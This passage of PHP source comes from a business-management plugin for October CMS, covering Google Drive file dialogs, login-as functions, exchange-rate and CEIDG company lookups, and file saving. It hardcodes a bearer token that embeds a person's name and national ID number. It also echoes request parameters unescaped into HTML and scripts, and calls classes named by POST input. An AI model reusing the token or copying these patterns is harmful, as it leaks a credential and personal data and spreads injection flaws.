			echo "</div>";


		}

	}


	public function drive_rename()
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_drive')) return;

		if(Input::get("action") == "rename" && Input::filled("id") && Input::filled("filename")){

			$client = Google::connect();
			if($client->getAccessToken()){

				$service = new \Google_Service_Drive($client);

				$file = new \Google_Service_Drive_DriveFile();
				$file->setName(Input::get("filename"));

				$updatedFile = $service->files->update(Input::get("id"), $file);

				Flash::success(Lang::get('eprog.manager::lang.process_success'));
				echo "<script>parent.window.modal.dialog('close');parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/drive?folder=".Input::get("folder")."&name=".Input::get("name")."'</script>";	

			}


		}
		else{	

			include 'plugins/eprog/manager/views/modal/header.php';


			echo "<div style=\"font-family:'Segoe UI',Helvetica,Arial;font-size:14px;\"><center><br>";
			echo "<div style=\"width:300px;text-align:left\">";
			echo e(trans("eprog.manager::lang.drive_new_name"));
			echo "<input type=\"hidden\" id=\"id\" name=\"id\" value=\"".Input::get("id")."\">";
			echo "<input type=\"hidden\" id=\"folder\" name=\"folder\" value=\"".Input::get("folder")."\">";
			echo "<input type=\"hidden\" id=\"name\" name=\"name\" value=\"".Input::get("name")."\">";
			echo "<div><center>";
			echo "<input id=\"filename\" type=\"filename\" name=\"filename\" value=\"".Input::get("filename")."\" size=\"40\" placeholder=\"".e(trans("eprog.manager::lang.name"))."\" class=\"form-control\"  style=\"margin-top:10px\">";
			echo "<div style=\"margin-top:10px;color:red;height:25px\"><div id=\"error\" style=\"display:none\">".e(trans("eprog.manager::lang.drive_enter_name"))."</div></div>";
			echo "<div id=\"load\" class=\"loadmodal loading-indicator-container\"  style=\"display:none;margin-left:20px\"><div class=\"loading-indicator  size-small indicator-center\" style=\"background-color: #fff;\"><span style=\"margin-top:0px\"></span></div></div>";
			echo "<button class=\"btn btn-primary oc-icon-pencil\"  style=\"margin-top:10px\" onclick=\"if($('#filename').val().trim() == ''){ $('#error').show(); return}$('#error').hide();$(this).hide();$('#load').show();window.location.href='/".config('cms.backendUri')."/eprog/manager/feed/drive_rename?action=rename&id=' + $('#id').val() + '&filename=' + $('#filename').val() + '&folder=' + $('#folder').val() + '&name=' + $('#name').val() \">".e(trans("eprog.manager::lang.drive_rename"))."</button>";
			echo "</div></div>";
			echo "</div>";


		}

	}

	public function drive_copy()
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_drive')) return;

		if(Input::get("action") == "copy" && Input::filled("id") && Input::filled("filename")){

			$client = Google::connect();
			if($client->getAccessToken()){

				$service = new \Google_Service_Drive($client);

				$file = new \Google_Service_Drive_DriveFile();
				$file->setName(Input::get("filename"));

				$service->files->copy(Input::get("id"), $file);

				Flash::success(Lang::get('eprog.manager::lang.process_success'));
				echo "<script>parent.window.modal.dialog('close');parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/drive?folder=".Input::get("folder")."&name=".Input::get("name")."'</script>";	

			}


		}
		else{	

			$exp = explode(".", Input::get("filename"));
			if(sizeof($exp) == 2)
				$filename = $exp[0]."_copy.".$exp[1];
			else
				$filename = Input::get("filename")."_copy";

			include 'plugins/eprog/manager/views/modal/header.php';
			echo  "<script  src=\"http://emode.pl/modules/backend/assets/js/vendor/jquery.min.js?v=1.2.3\" importance=\"high\"></script>";

			echo "<div style=\"font-family:'Segoe UI',Helvetica,Arial;font-size:14px;\"><center><br>";
			echo "<div style=\"width:300px;text-align:left\">";
			echo e(trans("eprog.manager::lang.drive_copy_file"));
			echo "<input type=\"hidden\" id=\"id\" name=\"id\" value=\"".Input::get("id")."\">";
			echo "<input type=\"hidden\" id=\"folder\" name=\"folder\" value=\"".Input::get("folder")."\">";
			echo "<input type=\"hidden\" id=\"name\" name=\"name\" value=\"".Input::get("name")."\">";
			echo "<div><center>";
			echo "<input id=\"filename\" type=\"filename\" name=\"filename\" value=\"".$filename."\" size=\"40\" placeholder=\"".e(trans("eprog.manager::lang.name"))."\" class=\"form-control\"  style=\"margin-top:10px\">";
			echo "<div style=\"margin-top:10px;color:red;height:25px\"><div id=\"error\" style=\"display:none\">".e(trans("eprog.manager::lang.drive_enter_name"))."</div></div>";
			echo "<div id=\"load\" class=\"loadmodal loading-indicator-container\"  style=\"display:none;margin-left:20px\"><div class=\"loading-indicator  size-small indicator-center\" style=\"background-color: #fff;\"><span style=\"margin-top:0px\"></span></div></div>";
			echo "<button class=\"btn btn-primary oc-icon-files-o\"  style=\"margin-top:10px\" onclick=\"if($('#filename').val().trim() == ''){ $('#error').show(); return}$('#error').hide();$(this).hide();$('#load').show();window.location.href='/".config('cms.backendUri')."/eprog/manager/feed/drive_copy?action=copy&id=' + $('#id').val() + '&filename=' + $('#filename').val() + '&folder=' + $('#folder').val() + '&name=' + $('#name').val() \">".e(trans("eprog.manager::lang.drive_copy"))."</button>";
			echo "</div></div>";
			echo "</div>";


		}

	}

	public function drive_move()
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_drive')) return;

		if(Input::get("action") == "move" && Input::filled("id")){

			$client = Google::connect();
			if($client->getAccessToken()){

				$service = new \Google_Service_Drive($client);

				$file = new \Google_Service_Drive_DriveFile();
				$file = $service->files->update(Input::get("id"), $file, [
				    'addParents' => Input::get('folder'),
				    'removeParents' => ''
				]);
				
				Flash::success(Lang::get('eprog.manager::lang.process_success'));
				echo "<script>parent.window.modal.dialog('close');parent.window.location.href=parent.window.location.href</script>";	

	
			}


		}
		else{	

			$client = Google::connect();
			if($client->getAccessToken()){

				$service = new \Google_Service_Drive($client);

				$parameters  = array(
				    'corpora' => "allDrives",
				    'pageSize' => 100,
				    'fields' => "nextPageToken, files(id,name,parents)",
				    'includeItemsFromAllDrives' => 'true',
				    'supportsAllDrives' => 'true',
				    'orderBy' => 'folder, name'
				);

				$parameters['q']  =  "'me' in owners and mimeType='application/vnd.google-apps.folder' and trashed=false and 'root' in parents";
				$files = $service->files->listFiles($parameters);
				$root_id = $files[0]->id ?? '';
				$root = $files[0]->parents[0] ?? '';

				$parameters['q']  =  "'me' in owners and mimeType='application/vnd.google-apps.folder' and trashed=false";
				$files = $service->files->listFiles($parameters);
				
				foreach($files as $file)
				    $data[] =  ["gid" => $file->id, "parent" => $file->parents[0] ?? '', 'name' => $file->name];

				include 'plugins/eprog/manager/views/modal/header.php';
				echo "<style>ul,li {list-style:none;font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial;}</style>";
				echo "<div style=\"font-family:'Segoe UI',Helvetica,Arial;font-size:14px;margin-top:12px;margin-bottom:5px\"><center>".e(trans("eprog.manager::lang.drive_move_folder"))."</div>";
				echo "<div id=\"tree\" style=\"text-align:left\">";
				if(Input::get("folder") != "")
					echo "<ul><li><i class=\"oc-icon-folder\" class=\"move\" style=\"font-size:20px;color:var(--mcolor)\"></i><a href=\"javascript:\" onclick=\"$('#tree').hide();$('#load').show();window.location.href='/".config('cms.backendUri')."/eprog/manager/feed/drive_move?action=move&id=".Input::get("id")."&folder=".$root."&name='\" style=\"font-size:13px\">".e(trans("eprog.manager::lang.mainFolder"))."</a></li>";
				else
					echo "<ul><li><i class=\"oc-icon-folder\" class=\"move\" style=\"font-size:20px;color:var(--mcolor)\"></i><span style=\"font-size:13px;\">".e(trans("eprog.manager::lang.mainFolder"))."</span></li>";
				echo self::driveTree($data,$root);
				echo "</ul></div>";			
				echo "<div id=\"load\" class=\"loadmodal loading-indicator-container\"  style=\"display:none;margin-left:20px;height:350px\"><div class=\"loading-indicator  size-small indicator-center\" style=\"background-color: #fff;\"><span style=\"margin-top:0px\"></span></div></div>";


			}


		}

	}

	public function invoice_select($type) {


		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice')) return;

		if($type == 1)
			return Invoice::pro_number();
		else	
			return Invoice::number();

	}

	private function driveTree($elements, $parentId = 0) {

	    $ret = "<ul>";
	    foreach ($elements as $element) {
	        if ($element['parent'] == $parentId) {
	            $children = self::driveTree($elements, $element['gid']);
	            if(Input::get("folder") != $element['gid'])
	            	$ret .= "<li><i class=\"oc-icon-folder\" class=\"move\" style=\"font-size:20px;color:var(--mcolor)\"></i><a href=\"javascript:\" onclick=\"$('#tree').hide();$('#load').show();window.location.href='/".config('cms.backendUri')."/eprog/manager/feed/drive_move?action=move&id=".Input::get("id")."&folder=".$element['gid']."&name=".$element['name']."'\" style=\"font-size:13px\">".$element['name']."</a></li>";
	        	else
	        		$ret .= "<li><i class=\"oc-icon-folder\" class=\"move\" style=\"font-size:20px;color:var(--mcolor)\"></i><span style=\"font-size:13px;\">".$element['name']."</span></li>";
	            if($children) {
	                $element['children'] = $children;
	                $ret .= $children;
	            }               
	        }
	    }
	    $ret .= "</ul>";

	    return $ret;
	}


	public function login_admin($id)
	{
		
		if(!BackendAuth::getUser()->is_superuser) return;

		if(!isset($_SESSION)) session_start();

		$backenduser = BackendUser::find($id);

		if($backenduser){
			BackendAuth::loginUsingId($id);
			if(isset($_SESSION)) session_destroy();
			return  Redirect::to("/".config('cms.backendUri')."/eprog/manager/calendar"); 
		}
		else
			return  Redirect::back(); 


	}


	public function login_user($id)
	{

		if(!BackendAuth::getUser()->is_superuser) return;

		if(!isset($_SESSION)) session_start();

		$user = User::find($id);
		if($user){
			Auth::loginUsingId($id);
			return Redirect::back()->with('message', 'ok');	
		}
		else
		return  Redirect::back(); 


	}


	public function nbp($curr)
	{
	
		if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free') )) return;
		if(!$curr) return;

		$kursy = file_get_contents("https://api.nbp.pl/api/exchangerates/tables/A");
		$tabs = json_decode($kursy, true);
		foreach($tabs[0]["rates"] as $tab){	
				if($tab["code"] == $curr)
				echo str_replace(",",".",$tab["mid"]);
		}

	}


    public static function cedig($nip){

        if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free') )) return;
        if(!$nip) return;

        $token = "eyJraWQiOiJjZWlkZyIsImFsZyI6IkhTNTEyIn0.eyJnaXZlbl9uYW1lIjoiUmFkb3PFgmF3IiwicGVzZWwiOiI3ODA4MTcxOTQ3MiIsImlhdCI6MTc2NDU3ODUyMywiZmFtaWx5X25hbWUiOiJQYWN6ZXNueSIsImNsaWVudF9pZCI6IlVTRVItNzgwODE3MTk0NzItUkFET1PFgUFXLVBBQ1pFU05ZIn0.KfdK4CW3kly0cUHUuXPcoGDrxuVOLh1q4SOWp3V16kqYVD90w0IAQWO8wsXPxsqvwBwvXyDcz_QTL4cUtHFTlg";

        $url = "https://dane.biznes.gov.pl/api/ceidg/v3/firmy?nip=".str_replace("-","",$nip);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $headers = array(
            'Accept: application/json',
            'Authorization:Bearer '.$token
        );
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);

        $result = json_decode($result, true);
        $data = [];
        foreach($result['firmy'] ?? [] as $res){
            
            if($res['status'] == "AKTYWNY"){
                $data['name'] = $res['nazwa'];
                $data['adres1'] = "ul. ".$res['adresDzialalnosci']['ulica']." ".$res['adresDzialalnosci']['budynek'];
                $data['adres2'] = $res['adresDzialalnosci']['kod']." ".$res['adresDzialalnosci']['miasto'];
                $data['country'] = $res['adresDzialalnosci']['kraj'];
            }

        }

        return json_encode($data);

    
    }


    public static function cediguser($nip){

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_users')) return;
        if(!$nip) return;

        $token = "eyJraWQiOiJjZWlkZyIsImFsZyI6IkhTNTEyIn0.eyJnaXZlbl9uYW1lIjoiUmFkb3PFgmF3IiwicGVzZWwiOiI3ODA4MTcxOTQ3MiIsImlhdCI6MTc2NDU3ODUyMywiZmFtaWx5X25hbWUiOiJQYWN6ZXNueSIsImNsaWVudF9pZCI6IlVTRVItNzgwODE3MTk0NzItUkFET1PFgUFXLVBBQ1pFU05ZIn0.KfdK4CW3kly0cUHUuXPcoGDrxuVOLh1q4SOWp3V16kqYVD90w0IAQWO8wsXPxsqvwBwvXyDcz_QTL4cUtHFTlg";

        $url = "https://dane.biznes.gov.pl/api/ceidg/v3/firmy?nip=".str_replace("-","",$nip);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $headers = array(
            'Accept: application/json',
            'Authorization:Bearer '.$token
        );

        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);

        $result = json_decode($result, true);

        $data = [];
        foreach($result['firmy'] ?? [] as $res){
            
            if($res['status'] == "AKTYWNY"){
                $data['name'] = $res['nazwa'];
                $data['ulica'] = $res['adresDzialalnosci']['ulica'];
                $data['budynek'] = $res['adresDzialalnosci']['budynek'];
                $data['kod'] = $res['adresDzialalnosci']['kod'];
                $data['miasto'] = $res['adresDzialalnosci']['miasto'];
                $data['country'] = $res['adresDzialalnosci']['kraj'];
                $data['region'] = strtolower($res['adresDzialalnosci']['wojewodztwo']);
            }

        }

        return json_encode($data);

    
    }


	public function invoice_nr($type)
	{
	
        if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free') )) return;

		return Invoice::number($type);

	}

	public function fields()
	{
        if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free') )) return;
	
		$fields = ["pkwiu"=>Input::get("pkwiu") == "true" ? 1:0, "cn" => Input::get("cn") == "true" ? 1:0, "gtu" => Input::get("gtu") == "true" ? 1:0];
		Session::put("fields",$fields);

	}


	public function validate()
	{
		$xml = new \DOMDocument(); 
		$xml->loadXML(file_get_contents("send.xml")); 

		if (!$xml->schemaValidate('docs/schema_v2.xsd')) {
		    print '<b>DOMDocument::schemaValidate() Generated Errors!</b>';
		    libxml_display_errors();
		}
		else 
		    echo "ok";

	}

    public function savefile($model, $id = 0, $period = "", $method = "generatePdf", $param = "")
    {

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_accounting')) return;

        $period = explode("_", $period);
  
        $years = date('Y');
        $year = Session::get('selected.year') ?? date('Y');
        $month = Session::get('selected.month') ?? date('m');
        
        if(is_array($period) && sizeof($period) > 1){
            $year  = $period[1];
            $month = $period[0];
        }

        include 'plugins/eprog/manager/views/modal/header.php';
        
        echo "<center><br><br>";

        $type = ""; $raport = "";
        if($_POST){
            $save  = false;
            $model = "Eprog\\Manager\\Controllers\\".$_POST['model'];
            if($param)
                $file  = $model::$method($_POST['id'], $param);
            else
                $file  = $model::$method($_POST['id']);

            if(file_exists($file)) $save = ControllerFile::saveFile($file,$_POST['year'],$_POST['month'],$_POST['type']);  
            if($save){
                echo "<span style=\"color:var(--mcolor);font-size:16px\">";        
                echo trans('eprog.manager::lang.file_confirm_success')."<br>";
                echo "<span style=\"font-size:12px\">";       
                echo "</span></span>"; 
            }
            echo "<br><br><button class=\"btn btn-primary btn-xl\" onclick=\"parent.window.modal.dialog('close')\">".trans('eprog.manager::lang.close_window')."</button>";                
                           
         }   
         else {
           
             echo '<form  method="post"  action="" >';
             echo '
             <div style="width:400px">
                 <div id="csyear" class="toolbar-item cs" style="display:inline-block;margin-top:1px;">
                     <select id="year" name="year" class="form-control custom-select" style="width:90px;float:left !important;">';
                     
             for($i = 0; $i <= 10; $i++) {
                 echo '<option value="'.($years-$i).'" '
                     .($year == $years-$i ? 'selected' : '')
                     .'>'.($years-$i).'</option>';
             }

             echo '
                     </select> 
                 </div>

                 <div id="vsmonth" class="toolbar-item cs" style="display:inline-block;margin-top:1px;margin-left:5px">
                     <select id="month" name="month" class="form-control custom-select" style="width:120px;float:left !important;">';

             for($m = 1; $m <= 12; $m++) {
                 echo '<option value="'.$m.'" '
                     .($month == $m ? 'selected' : '')
                     .'>'.trans("eprog.manager::lang.months.".$m).'</option>';
             }

             echo '
                     </select> 
                 </div>
             </div>
             <div style="width:400px">';

             echo '<input type="radio" id="document" name="type" value="document" checked class="radio custom-radio" style="display:inline-block;margin-top:14px"> <label for="record" style="position:relative;top:-7px">'.trans('eprog.manager::lang.documents').'</label>';
             echo '<input type="radio" id="image" name="type" value="image"  '.(in_array($model,["internal","invoice","ksef","order"]) ? "checked" : "").' class="radio custom-radio" style="display:inline-block;margin-left:15px"> <label for="image" style="position:relative;top:-7px">'.trans('eprog.manager::lang.image').'</label>';
             echo '<input type="radio" id="media" name="type" value="media" class="radio custom-radio" style="display:inline-block;margin-left:15px"> <label for="media" style="position:relative;top:-7px">'.trans('eprog.manager::lang.media').'</label>';
             echo '<input type="hidden" name="model" value="'.$model.'" />';
             echo '<input type="hidden" name="id" value="'.$id.'" />';
             echo '<input type="hidden" name="_token" value="'.csrf_token().'" />';
             echo '<br><br><button type="submit" onclick="$(\'#loader\').show();$(this).hide()" class="btn btn-primary oc-icon-floppy-o">'.trans('eprog.manager::lang.save').'</button>';
             echo '<div id="loader" class="loadmodal loading-indicator-container" style="margin-left:20px;display:none"><div class="loading-indicator  size-small indicator-center" style="background-color: transparent;"><span  style="margin-top:-10px;"></span></div></div>';
             echo '</div>';
             echo '</form>';

             if(!is_array($raport) && $raport != "")
             echo "<br><span style=\"color:red;\">".$raport."<br><br></span>";

         }

    }

    public function savetaxfile($model, $id = 0, $period = "", $method = "generatePdf", $param = "")
    {

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_accounting')) return;

        $period = explode("_", $period);
    
        $years = date('Y');
        $year = Session::get('selected.year') ?? date('Y');
        $month = Session::get('selected.month') ?? date('m');
        
        if(is_array($period) && sizeof($period) > 1){
            $year  = $period[1];
            $month = $period[0];
        }

        include 'plugins/eprog/manager/views/modal/header.php';
        
        echo "<center><br><br>";

        $type = ""; $raport = "";
        if($_POST){
            $save  = false;
            $model = "Eprog\\Manager\\Controllers\\".$_POST['model'];
            if($param)
                $file  = $model::$method($_POST['id'], $param);
            else
                $file  = $model::$method($_POST['id']);

            if(file_exists($file)) $save = ControllerTaxfile::saveFile($file,$_POST['year'],$_POST['month'],$_POST['type']);  
            if($save){
                echo "<span style=\"color:var(--mcolor);font-size:16px\">";        
                echo trans('eprog.manager::lang.file_confirm_success')."<br>";
                echo "<span style=\"font-size:12px\">";       
                echo "</span></span>"; 
            }
            echo "<br><br><button class=\"btn btn-primary btn-xl\" onclick=\"parent.window.modal.dialog('close')\">".trans('eprog.manager::lang.close_window')."</button>";                
                           
         }   
         else {
           
             echo '<form  method="post"  action="" >';
             echo '
             <div style="width:400px">
                 <div id="csyear" class="toolbar-item cs" style="display:inline-block;margin-top:1px;">
                     <select id="year" name="year" class="form-control custom-select" style="width:90px;float:left !important;">';
                     
             for($i = 0; $i <= 10; $i++) {
                 echo '<option value="'.($years-$i).'" '
                     .($year == $years-$i ? 'selected' : '')
                     .'>'.($years-$i).'</option>';
             }

             echo '
                     </select> 
                 </div>

                 <div id="vsmonth" class="toolbar-item cs" style="display:inline-block;margin-top:1px;margin-left:5px">
                     <select id="month" name="month" class="form-control custom-select" style="width:120px;float:left !important;">';

             for($m = 1; $m <= 12; $m++) {
                 echo '<option value="'.$m.'" '
                     .($month == $m ? 'selected' : '')
                     .'>'.trans("eprog.manager::lang.months.".$m).'</option>';
             }

             echo '
                     </select> 
                 </div>
             </div>
             <div style="width:400px">';


             echo '<input type="radio" id="record" name="type" value="record" checked class="radio custom-radio" style="display:inline-block;margin-top:14px"> <label for="record" style="position:relative;top:-7px">'.trans('eprog.manager::lang.record').'</label>';
             echo '<input type="radio" id="document" name="type" value="document"  '.(in_array($model,["internal","invoice","ksef","order"]) ? "checked" : "").' class="radio custom-radio" style="display:inline-block;margin-left:15px"> <label for="document" style="position:relative;top:-7px">'.trans('eprog.manager::lang.documents').'</label>';
             echo '<input type="radio" id="other" name="type" value="other" class="radio custom-radio" style="display:inline-block;margin-left:15px"> <label for="document" style="position:relative;top:-7px">'.trans('eprog.manager::lang.other').'</label>';
             echo '<input type="hidden" name="model" value="'.$model.'" />';
             echo '<input type="hidden" name="id" value="'.$id.'" />';
             echo '<input type="hidden" name="_token" value="'.csrf_token().'" />';
             echo '<br><br><button type="submit" onclick="$(\'#loader\').show();$(this).hide()" class="btn btn-primary oc-icon-floppy-o" >'.trans('eprog.manager::lang.save').'</button>';
             echo '<div id="loader" class="loadmodal loading-indicator-container" style="margin-left:20px;display:none"><div class="loading-indicator  size-small indicator-center" style="background-color: transparent;"><span  style="margin-top:-10px;"></span></div></div>';
             echo '</div>';
             echo '</form>';

             if(!is_array($raport) && $raport != "")
             echo "<br><span style=\"color:red;\">".$raport."<br><br></span>";

         }

    }



}